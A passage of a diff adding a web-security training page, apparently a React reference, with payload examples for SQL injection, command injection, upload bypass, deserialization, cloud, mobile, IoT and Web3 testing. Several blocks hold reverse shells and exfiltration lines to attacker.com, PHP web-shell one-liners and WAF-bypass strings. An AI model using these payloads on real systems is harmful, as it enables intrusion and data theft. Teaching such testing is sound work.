+                    code={`-- Union-based Injection
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+
+-- Boolean-based Blind Injection
+' AND 1=1--
+' AND 1=2--
+' AND LENGTH(database())>5--
+' AND SUBSTR(database(),1,1)='a'--
+' AND ASCII(SUBSTR(database(),1,1))>97--
+
+-- Time-based Blind Injection
+'; WAITFOR DELAY '00:00:05'--
+' AND SLEEP(5)--
+'; SELECT pg_sleep(5)--
+
+-- Error-based Injection
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--`}
+                    title="SQL Injection Techniques"
+                  />
+                  <CodeExample
+                    language="sql"
+                    code={`-- Advanced WAF Bypass
+/*!50000SELECT*/ * FROM users
+/**/UNION/**/SELECT/**/
+UNION%a0SELECT%a0
+UniOn SeLeCt
+%55%4e%49%4f%4e %53%45%4c%45%43%54
+
+-- Second-order Injection
+admin'-- (stored, executed later)
+'; INSERT INTO users VALUES ('admin2','pass123')--
+
+-- Database-specific Techniques
+-- MySQL
+' AND @@version LIKE '5%'--
+'; SET @sql=CONCAT('SELECT * FROM ',database(),'.users'); 
+  PREPARE stmt FROM @sql; EXECUTE stmt--
+
+-- PostgreSQL
+'; COPY (SELECT '') TO PROGRAM 'nc attacker.com 4444 -e /bin/sh'--
+
+-- Oracle
+' UNION SELECT NULL,NULL FROM dual--
+' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--`}
+                    title="Advanced SQL Injection"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Command Injection Techniques</h4>
+                <CodeExample
+                  language="bash"
+                  code={`# Basic Command Injection
+; ls -la
+| whoami
+& id
+&& cat /etc/passwd
+|| uname -a
+\`whoami\`
+$(whoami)
+
+# Advanced Bypass Techniques
+; w'h'o'a'm'i
+; who$IFS$()ami
+; who\${IFS}ami
+; wh''oami
+; wh""oami
+; echo "d2hvYW1p" | base64 -d | sh
+; printf "\\x77\\x68\\x6f\\x61\\x6d\\x69" | sh
+
+# Blind Command Injection
+; sleep 5
+; ping -c 4 attacker.com
+; curl http://attacker.com/$(whoami)
+; nslookup $(whoami).attacker.com
+
+# Out-of-band Techniques
+; curl http://attacker.com/$(cat /etc/passwd | base64)
+; nc attacker.com 4444 -e /bin/sh
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1`}
+                  title="Command Injection Payloads"
+                />
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>File Upload Exploitation</CardTitle>
+              <CardDescription>Advanced file upload vulnerability exploitation techniques</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="bash"
+                  code={`# Extension Bypasses
+.php
+.php3, .php4, .php5
+.phtml
+.pht
+.phps
+.php.jpg
+.jpg.php
+.png.php
+
+# Double Extension
+file.jpg.php
+file.png.php
+file.gif.asp
+
+# Null Byte Injection
+file.php%00.jpg
+file.asp%00.png
+
+# Case Variation
+file.PHP
+file.Php
+file.pHp
+
+# Magic Bytes Manipulation
+# Add GIF header to PHP file
+GIF87a<?php system($_GET['cmd']); ?>
+
+# Add JPEG header
+ÿØÿà<?php system($_GET['cmd']); ?>`}
+                  title="Upload Filter Bypass"
+                />
+                <CodeExample
+                  language="bash"
+                  code={`# Polyglot Files
+# GIF + PHP
+GIF87a
+<?php system($_GET['cmd']); ?>
+
+# Path Traversal in Filename
+../../../shell.php
+..\\\\..\\\\..\\\\shell.asp
+....//....//shell.jsp
+
+# Server-specific Bypasses
+# Apache .htaccess
+AddType application/x-httpd-php .jpg
+
+# IIS web.config
+<configuration>
+  <system.webServer>
+    <handlers>
+      <add name="PHP via FastCGI" 
+           path="*.jpg" 
+           verb="*" 
+           modules="FastCgiModule" 
+           scriptProcessor="C:\\php\\php-cgi.exe" />
+    </handlers>
+  </system.webServer>
+</configuration>`}
+                  title="Advanced Upload Techniques"
+                />
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Deserialization Attacks</CardTitle>
+              <CardDescription>Multi-language deserialization exploitation</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="java"
+                  code={`// Java Deserialization
+// Commons Collections 3.1
+java.util.PriorityQueue
+org.apache.commons.collections.functors.InvokerTransformer
+org.apache.commons.collections.functors.ChainedTransformer
+
+// ysoserial payload generation
+java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64
+
+// Spring Framework
+org.springframework.beans.factory.ObjectFactory
+
+// Fastjson
+{"@type":"com.sun.rowset.JdbcRowSetImpl",
+ "dataSourceName":"ldap://attacker.com:1389/Exploit",
+ "autoCommit":true}`}
+                  title="Java Deserialization"
+                />
+                <CodeExample
+                  language="python"
+                  code={`# Python Pickle Deserialization
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = pickle.dumps(Exploit())
+
+# PyYAML Deserialization
+!!python/object/apply:os.system ["id"]
+!!python/object/apply:subprocess.check_output [["id"]]
+
+# Django Deserialization
+django.core.signing.loads(payload, key='secret_key')
+
+# PHP Unserialize
+class Exploit {
+    public $command = 'system';
+    public $args = 'id';
+    
+    public function __destruct() {
+        call_user_func($this->command, $this->args);
+    }
+}
+
+// Payload: O:7:"Exploit":2:{s:7:"command";s:6:"system";s:4:"args";s:2:"id";}`}
+                  title="Multi-language Deserialization"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Professional Testing Methodologies */}
+        <TabsContent value="professional-testing" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Shield className="h-5 w-5" />
+                OWASP Testing Guide Implementation
+              </CardTitle>
+              <CardDescription>
+                Complete implementation of OWASP Testing Guide v4.2 methodology
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Information Gathering (WSTG-INFO)</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">WSTG-INFO-01: Search Engine Discovery</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Google dorking with 100+ operators</li>
+                        <li>• Bing/Yahoo specific search techniques</li>
+                        <li>• International search engines (Baidu, Yandex)</li>
+                        <li>• Image and news search reconnaissance</li>
+                        <li>• Social media platform discovery</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">WSTG-INFO-02: Web Server Fingerprinting</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• HTTP header analysis and manipulation</li>
+                        <li>• Response timing and behavior analysis</li>
+                        <li>• Error page fingerprinting</li>
+                        <li>• HTTP method enumeration</li>
+                        <li>• SSL/TLS configuration assessment</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="bash"
+                    code={`# WSTG-INFO-01: Search Engine Discovery
+# Google Dorking Examples
+site:example.com filetype:pdf
+site:example.com inurl:admin
+site:example.com ext:sql | ext:db
+site:example.com "index of"
+site:example.com "password" | "passwd"
+
+# WSTG-INFO-02: Web Server Fingerprinting
+curl -I https://example.com
+nmap -sV -p 80,443 example.com
+whatweb https://example.com
+httprint -h example.com -s signatures.txt
+
+# WSTG-INFO-03: Metafiles Review
+curl https://example.com/robots.txt
+curl https://example.com/sitemap.xml
+curl https://example.com/.well-known/security.txt
+curl https://example.com/crossdomain.xml`}
+                    title="OWASP Testing Examples"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">PTES (Penetration Testing Execution Standard)</h4>
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                  <div>
+                    <h5 className="font-medium mb-2">Phase 1: Pre-engagement</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Scoping discussions</li>
+                      <li>• Rules of engagement</li>
+                      <li>• Timeline establishment</li>
+                      <li>• Legal documentation</li>
+                      <li>• Communication protocols</li>
+                    </ul>
+                  </div>
+                  <div>
+                    <h5 className="font-medium mb-2">Phase 2: Intelligence Gathering</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• OSINT collection</li>
+                      <li>• Footprinting techniques</li>
+                      <li>• Social engineering prep</li>
+                      <li>• Physical security assessment</li>
+                      <li>• Target identification</li>
+                    </ul>
+                  </div>
+                  <div>
+                    <h5 className="font-medium mb-2">Phase 3: Threat Modeling</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Attack surface analysis</li>
+                      <li>• Threat actor profiling</li>
+                      <li>• Attack vector prioritization</li>
+                      <li>• Business impact assessment</li>
+                      <li>• Compliance requirements</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">OSSTMM - Scientific Testing Approach</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Security Analysis Framework</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• <strong>Porosity:</strong> System openness measurement</li>
+                        <li>• <strong>Limitations:</strong> Security control boundaries</li>
+                        <li>• <strong>Controls:</strong> Protective mechanisms analysis</li>
+                        <li>• <strong>Trust:</strong> Relationship verification</li>
+                        <li>• <strong>Visibility:</strong> Information exposure assessment</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Testing Channels</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Human security testing</li>
+                        <li>• Physical security assessment</li>
+                        <li>• Wireless security evaluation</li>
+                        <li>• Telecommunications testing</li>
+                        <li>• Data networks analysis</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="python"
+                    code={`# OSSTMM Porosity Calculation
+def calculate_porosity(open_ports, total_ports):
+    """Calculate system porosity"""
+    return (open_ports / total_ports) * 100
+
+# Security Control Effectiveness
+def control_effectiveness(attacks_blocked, total_attacks):
+    """Measure security control effectiveness"""
+    return (attacks_blocked / total_attacks) * 100
+
+# Trust Verification Score
+def trust_score(verified_components, total_components):
+    """Calculate trust verification score"""
+    return (verified_components / total_components) * 100
+
+# Example Usage
+porosity = calculate_porosity(25, 65535)  # 25 open ports
+effectiveness = control_effectiveness(95, 100)  # 95% blocked
+trust = trust_score(8, 10)  # 8/10 components verified
+
+print(f"System Porosity: {porosity:.4f}%")
+print(f"Control Effectiveness: {effectiveness}%")
+print(f"Trust Score: {trust}%")`}
+                    title="OSSTMM Metrics"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Professional Reporting Standards</CardTitle>
+              <CardDescription>Executive and technical reporting templates</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="space-y-4">
+                  <div>
+                    <h5 className="font-medium mb-2">Executive Summary Template</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Assessment overview and scope</li>
+                      <li>• Key findings summary with risk ratings</li>
+                      <li>• Business impact assessment</li>
+                      <li>• Strategic recommendations timeline</li>
+                      <li>• Compliance and regulatory implications</li>
+                    </ul>
+                  </div>
+                  <div>
+                    <h5 className="font-medium mb-2">Technical Finding Structure</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Vulnerability classification (OWASP/CWE)</li>
+                      <li>• CVSS scoring and risk assessment</li>
+                      <li>• Proof-of-concept demonstration</li>
+                      <li>• Business impact analysis</li>
+                      <li>• Detailed remediation guidance</li>
+                    </ul>
+                  </div>
+                </div>
+                <CodeExample
+                  language="markdown"
+                  code={`# Technical Finding Template
+
+## [Vulnerability Name] - [Risk Level]
+
+**Vulnerability Details:**
+- Type: [OWASP Category/CWE]
+- Affected Components: [Systems/Applications]
+- CVSS Score: [Base score and vector]
+- Discovery Method: [Manual/Automated]
+
+**Description:**
+[Detailed vulnerability explanation]
+
+**Proof of Concept:**
+[Step-by-step exploitation demonstration]
+
+**Business Impact:**
+- Confidentiality: [High/Medium/Low/None]
+- Integrity: [High/Medium/Low/None]  
+- Availability: [High/Medium/Low/None]
+
+**Remediation:**
+### Immediate Actions
+[Quick fixes and workarounds]
+
+### Long-term Solutions
+[Comprehensive fixes]
+
+**References:**
+- [OWASP references]
+- [CVE/CWE identifiers]`}
+                  title="Report Template"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Cloud Security Testing */}
+        <TabsContent value="cloud-security" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Cloud className="h-5 w-5" />
+                AWS Security Assessment
+              </CardTitle>
+              <CardDescription>
+                Comprehensive AWS web application security testing methodology
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">AWS Service Discovery & Enumeration</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="bash"
+                    code={`# S3 Bucket Enumeration
+aws s3 ls s3://company-name
+aws s3 ls s3://company-backup
+aws s3 ls s3://company-logs
+bucket_finder.rb wordlist.txt
+slurp domain company.com
+
+# CloudFront Distribution Discovery
+aws cloudfront list-distributions
+dig company.com
+nslookup company.com
+
+# EC2 Instance Metadata (SSRF)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/user-data/
+
+# Lambda Function Discovery
+aws lambda list-functions
+aws lambda get-function --function-name function-name`}
+                    title="AWS Reconnaissance"
+                  />
+                  <CodeExample
+                    language="bash"
+                    code={`# AWS Security Tools
+# ScoutSuite - Multi-cloud auditing
+pip install scoutsuite
+scout aws --profile default
+
+# Prowler - AWS security assessment
+git clone https://github.com/prowler-cloud/prowler
+./prowler aws
+
+# Pacu - AWS exploitation framework
+git clone https://github.com/RhinoSecurityLabs/pacu
+python3 pacu.py
+
+# S3Scanner - Bucket assessment
+git clone https://github.com/sa7mon/S3Scanner
+python s3scanner.py sites.txt
+
+# Cloud_enum - Multi-cloud enumeration
+python3 cloud_enum.py -k company`}
+                    title="AWS Security Tools"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Common AWS Web Application Misconfigurations</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">S3 Bucket Security Issues</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Public read/write permissions</li>
+                        <li>• Bucket policy misconfigurations</li>
+                        <li>• ACL bypass techniques</li>
+                        <li>• Server-side encryption disabled</li>
+                        <li>• Versioning and MFA delete disabled</li>
+                        <li>• Logging and monitoring gaps</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">IAM Weaknesses</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Overprivileged policies</li>
+                        <li>• Wildcard permissions (*)</li>
+                        <li>• Cross-account trust issues</li>
+                        <li>• Root account usage</li>
+                        <li>• Access key exposure</li>
+                        <li>• Weak password policies</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">API Gateway Security</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Unauthenticated endpoints</li>
+                        <li>• CORS misconfigurations</li>
+                        <li>• Rate limiting bypass</li>
+                        <li>• Request/response manipulation</li>
+                        <li>• Lambda authorization flaws</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">CloudFront Issues</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Cache poisoning vulnerabilities</li>
+                        <li>• Origin server exposure</li>
+                        <li>• Signed URL bypass</li>
+                        <li>• Geographic restriction bypass</li>
+                        <li>• Header injection attacks</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>Azure & GCP Security Testing</CardTitle>
+              <CardDescription>Multi-cloud security assessment techniques</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <CodeExample
+                  language="powershell"
+                  code={`# Azure Security Assessment
+# Azure AD Enumeration
+Connect-AzureAD
+Get-AzureADUser
+Get-AzureADGroup
+Get-AzureADApplication
+
+# Storage Account Assessment
+Get-AzStorageAccount
+Get-AzStorageContainer
+Get-AzStorageBlob
+
+# Key Vault Enumeration
+Get-AzKeyVault
+Get-AzKeyVaultSecret
+Get-AzKeyVaultKey
+
+# ROADtools - Azure AD reconnaissance
+pip install roadtools
+roadrecon auth -u user@company.com -p password
+roadrecon gather
+roadrecon gui`}
+                  title="Azure Security Testing"
+                />
+                <CodeExample
+                  language="bash"
+                  code={`# GCP Security Assessment
+# Service Discovery
+gcloud projects list
+gcloud compute instances list
+gcloud storage buckets list
+gcloud sql instances list
+
+# IAM Analysis
+gcloud projects get-iam-policy project-id
+gcloud iam service-accounts list
+gcloud iam roles list
+
+# Cloud Storage Assessment
+gsutil ls gs://company-bucket
+gsutil iam get gs://bucket-name
+gsutil iam ch allUsers:objectViewer gs://bucket-name
+
+# G-Scout - GCP security assessment
+python g-scout.py`}
+                  title="GCP Security Testing"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Mobile & IoT Security */}
+        <TabsContent value="mobile-iot" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Smartphone className="h-5 w-5" />
+                Mobile Web Application Security
+              </CardTitle>
+              <CardDescription>
+                Mobile-specific web security testing methodologies
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Mobile-Specific Vulnerabilities</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">Touch Interface Exploitation</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Tap jacking attacks on mobile interfaces</li>
+                        <li>• UI redressing specific to mobile browsers</li>
+                        <li>• Gesture-based security bypasses</li>
+                        <li>• Screen reader accessibility abuse</li>
+                        <li>• Mobile keyboard input manipulation</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Progressive Web App (PWA) Security</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Service worker exploitation techniques</li>
+                        <li>• Web app manifest manipulation</li>
+                        <li>• Offline functionality abuse</li>
+                        <li>• Push notification hijacking</li>
+                        <li>• Background sync manipulation</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="javascript"
+                    code={`// Mobile Browser Exploitation
+// Tapjacking Example
+document.addEventListener('touchstart', function(e) {
+  // Capture touch events
+  var touch = e.touches[0];
+  var element = document.elementFromPoint(touch.clientX, touch.clientY);
+  
+  // Redirect sensitive actions
+  if (element.id === 'delete-button') {
+    window.location = 'https://attacker.com/phish';
+  }
+});
+
+// Service Worker Manipulation
+self.addEventListener('fetch', function(event) {
+  if (event.request.url.includes('/api/sensitive')) {
+    // Intercept and modify requests
+    event.respondWith(
+      fetch('https://attacker.com/steal-data', {
+        method: 'POST',
+        body: event.request.body
+      })
+    );
+  }
+});
+
+// PWA Manifest Manipulation
+{
+  "name": "Legitimate App",
+  "start_url": "https://attacker.com/phish",
+  "display": "standalone",
+  "icons": [...]
+}`}
+                    title="Mobile Exploitation Examples"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">WebView Security Testing</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="java"
+                    code={`// Android WebView Vulnerabilities
+// Insecure WebView Configuration
+webView.getSettings().setJavaScriptEnabled(true);
+webView.getSettings().setAllowFileAccess(true);
+webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
+webView.addJavascriptInterface(new WebAppInterface(this), "Android");
+
+// JavaScript Interface Exploitation
+<script>
+Android.method("malicious_payload");
+</script>
+
+// File URI Exploitation
+file:///android_asset/
+file:///data/data/com.company.app/
+content://`}
+                    title="Android WebView"
+                  />
+                  <CodeExample
+                    language="objc"
+                    code={`// iOS WebView Security
+// UIWebView (Deprecated but still found)
+UIWebView *webView = [[UIWebView alloc] init];
+[webView loadRequest:[NSURLRequest requestWithURL:
+  [NSURL URLWithString:@"javascript:alert('XSS')"]]];
+
+// WKWebView Security Configuration
+WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
+WKUserContentController *controller = [[WKUserContentController alloc] init];
+[controller addScriptMessageHandler:self name:@"bridge"];
+config.userContentController = controller;
+
+// JavaScript Bridge Exploitation
+window.webkit.messageHandlers.bridge.postMessage({
+  "action": "sensitive_operation",
+  "payload": "malicious_data"
+});`}
+                    title="iOS WebView"
+                  />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader>
+              <CardTitle>IoT Web Interface Security</CardTitle>
+              <CardDescription>Internet of Things web application security testing</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="space-y-4">
+                  <div>
+                    <h5 className="font-medium mb-2">IoT-Specific Attack Vectors</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• Default credential exploitation</li>
+                      <li>• Firmware extraction and analysis</li>
+                      <li>• Communication protocol vulnerabilities</li>
+                      <li>• Device management interface flaws</li>
+                      <li>• Hardware attack surface assessment</li>
+                    </ul>
+                  </div>
+                  <div>
+                    <h5 className="font-medium mb-2">Hardware Security Testing</h5>
+                    <ul className="text-sm space-y-1 text-cybr-muted">
+                      <li>• UART/Serial interface discovery</li>
+                      <li>• JTAG debug port exploitation</li>
+                      <li>• SPI/I2C communication analysis</li>
+                      <li>• Side-channel attack vectors</li>
+                      <li>• Physical tampering detection bypass</li>
+                    </ul>
+                  </div>
+                </div>
+                <CodeExample
+                  language="bash"
+                  code={`# IoT Security Testing Tools
+# Firmware Analysis Toolkit
+git clone https://github.com/attify/firmware-analysis-toolkit
+./fat.py firmware.bin
+
+# Binwalk - Firmware extraction
+binwalk -e firmware.bin
+binwalk --signature firmware.bin
+
+# Firmwalker - Firmware analysis
+./firmwalker.sh /path/to/firmware
+
+# EMBA - Embedded Analyzer
+sudo ./emba.sh -l ~/firmware/firmware.bin
+
+# Shodan CLI - IoT device discovery
+shodan search "default password" --fields ip_str,port,org
+
+# Hardware Interface Testing
+# UART Communication
+screen /dev/ttyUSB0 115200
+minicom -D /dev/ttyUSB0 -b 115200
+
+# SPI Flash Dump
+flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware_dump.bin`}
+                  title="IoT Testing Tools"
+                />
+              </div>
+            </CardContent>
+          </Card>
+        </TabsContent>
+
+        {/* Advanced Research Topics */}
+        <TabsContent value="advanced-research" className="mt-6 space-y-6">
+          <Card>
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Brain className="h-5 w-5" />
+                Cutting-Edge Security Research
+              </CardTitle>
+              <CardDescription>
+                Latest security research topics and emerging threat vectors
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div>
+                <h4 className="text-lg font-semibold mb-3">WebAssembly (WASM) Security</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">WASM Attack Vectors</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Memory corruption in WASM modules</li>
+                        <li>• JavaScript-WASM bridge vulnerabilities</li>
+                        <li>• Sandbox escape techniques</li>
+                        <li>• Reverse engineering WASM binaries</li>
+                        <li>• Side-channel attacks via WASM</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">WASM Analysis Tools</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• wabt - WebAssembly Binary Toolkit</li>
+                        <li>• wasm2c - WASM to C converter</li>
+                        <li>• wasm-decompile - Decompilation tool</li>
+                        <li>• Ghidra WASM plugin</li>
+                        <li>• Custom analysis frameworks</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="javascript"
+                    code={`// WASM Exploitation Techniques
+// Memory corruption example
+const wasmCode = new Uint8Array([
+  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+  // ... WASM bytecode for memory manipulation
+]);
+
+const wasmModule = new WebAssembly.Module(wasmCode);
+const wasmInstance = new WebAssembly.Instance(wasmModule);
+
+// JavaScript-WASM bridge exploitation
+const memory = new WebAssembly.Memory({initial: 10});
+const view = new Uint8Array(memory.buffer);
+
+// Manipulate WASM memory from JavaScript
+view[0] = 0x41; // Potential buffer overflow
+wasmInstance.exports.vulnerableFunction();
+
+// WASM reverse engineering
+const wasmBytes = await fetch('module.wasm').then(r => r.arrayBuffer());
+const module = await WebAssembly.compile(wasmBytes);
+const exports = WebAssembly.Module.exports(module);
+console.log('Exported functions:', exports);`}
+                    title="WASM Security Testing"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">AI/ML Security in Web Applications</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-4">
+                    <div>
+                      <h5 className="font-medium mb-2">AI/ML Attack Vectors</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Model poisoning attacks</li>
+                        <li>• Adversarial input generation</li>
+                        <li>• Model inversion attacks</li>
+                        <li>• Membership inference attacks</li>
+                        <li>• Model extraction techniques</li>
+                      </ul>
+                    </div>
+                    <div>
+                      <h5 className="font-medium mb-2">Web-specific ML Vulnerabilities</h5>
+                      <ul className="text-sm space-y-1 text-cybr-muted">
+                        <li>• Client-side model extraction</li>
+                        <li>• API endpoint ML model abuse</li>
+                        <li>• Training data injection via web forms</li>
+                        <li>• ML-powered authentication bypass</li>
+                        <li>• Recommendation system manipulation</li>
+                      </ul>
+                    </div>
+                  </div>
+                  <CodeExample
+                    language="python"
+                    code={`# AI/ML Security Testing
+import numpy as np
+import requests
+
+# Adversarial Attack Example
+def generate_adversarial_input(original_input, epsilon=0.1):
+    """Generate adversarial input to fool ML model"""
+    perturbation = np.random.uniform(-epsilon, epsilon, original_input.shape)
+    adversarial_input = original_input + perturbation
+    return np.clip(adversarial_input, 0, 1)
+
+# Model Extraction Attack
+def extract_model_via_api(api_endpoint, num_queries=1000):
+    """Extract ML model behavior via API queries"""
+    training_data = []
+    
+    for _ in range(num_queries):
+        # Generate random input
+        random_input = np.random.random((28, 28))  # Example image
+        
+        # Query the API
+        response = requests.post(api_endpoint, 
+                               json={'image': random_input.tolist()})
+        prediction = response.json()['prediction']
+        
+        training_data.append((random_input, prediction))
+    
+    return training_data
+
+# Model Poisoning via Web Form
+poisoned_data = {
+    'training_sample': malicious_input,
+    'label': incorrect_label,
+    'user_feedback': 'positive'  # Trick the system
+}
+
+requests.post('https://ml-app.com/feedback', json=poisoned_data)`}
+                    title="AI/ML Security Testing"
+                  />
+                </div>
+              </div>
+
+              <Separator />
+
+              <div>
+                <h4 className="text-lg font-semibold mb-3">Blockchain & Web3 Security</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <CodeExample
+                    language="solidity"
+                    code={`// Smart Contract Vulnerabilities
+pragma solidity ^0.8.0;
+
+contract VulnerableContract {
+    mapping(address => uint256) public balances;
+    
+    // Reentrancy vulnerability
+    function withdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount);
+        
+        // Vulnerable: External call before state change
+        (bool success,) = msg.sender.call{value: amount}("");
+        require(success);
+        
+        balances[msg.sender] -= amount;  // State change after external call
+    }
+    
+    // Integer overflow/underflow
+    function unsafeAdd(uint256 a, uint256 b) public pure returns (uint256) {
+        return a + b;  // No overflow protection
+    }
+    
+    // Access control bypass
+    address public owner;
+    function onlyOwner() public {
+        // Missing access control check
+        // require(msg.sender == owner);
+        selfdestruct(payable(msg.sender));
+    }
+}`}
+                    title="Smart Contract Vulnerabilities"
+                  />
+                  <CodeExample
+                    language="javascript"
+                    code={`// Web3 Security Testing
+const Web3 = require('web3');
+const web3 = new Web3('http://localhost:8545');
+
+// Smart contract interaction testing
+async function testContractSecurity(contractAddress, abi) {
+    const contract = new web3.eth.Contract(abi, contractAddress);
+    
+    // Test for reentrancy
+    const attackContract = new web3.eth.Contract(attackAbi, attackAddress);
+    await attackContract.methods.attack(contractAddress).send({from: attacker});
+    
+    // Test for overflow/underflow
+    try {
+        await contract.methods.unsafeAdd(
+            '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+            '1'
+        ).call();
+    } catch (error) {
+        console.log('Overflow protection detected');
+    }
+    
+    // Test access controls
